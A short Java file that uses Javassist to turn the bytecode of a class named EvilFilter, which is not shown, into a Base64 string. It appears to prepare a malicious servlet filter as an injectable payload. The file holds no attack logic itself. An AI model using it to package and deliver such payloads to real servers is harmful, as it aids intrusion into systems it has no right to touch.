package org.example;

import javassist.ClassPool;
import javassist.CtClass;


public class Base64Client {
    public static void main(String[] args) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(EvilFilter.class.getName());
        byte[] payloads = clazz.toBytecode();

        byte[] classData = java.util.Base64.getEncoder().encode(payloads);
        System.out.println(new String(classData));
    }
}
